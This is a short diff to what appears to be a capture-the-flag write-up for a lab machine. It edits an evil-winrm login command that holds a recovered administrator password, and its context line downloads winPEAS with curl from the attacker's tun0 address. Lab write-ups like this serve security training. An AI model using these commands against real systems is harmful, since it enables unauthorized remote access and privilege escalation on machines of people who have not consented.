@@ -159,6 +159,8 @@ curl.exe http://{tun0-interface-IP}/winPEASSany.exe -o winpeas.exe
 
 ```bash
 # connect using evil-winrm
-evil-winrm -i {IP_ADDRESS} -u administrator -p MEGACORP_4dm1n!!
+evil-winrm -i {IP_ADDRESS} -u administrator -p 'MEGACORP_4dm1n!!'
 ```
+
+-> navigate to both desktops to find the flag.
 
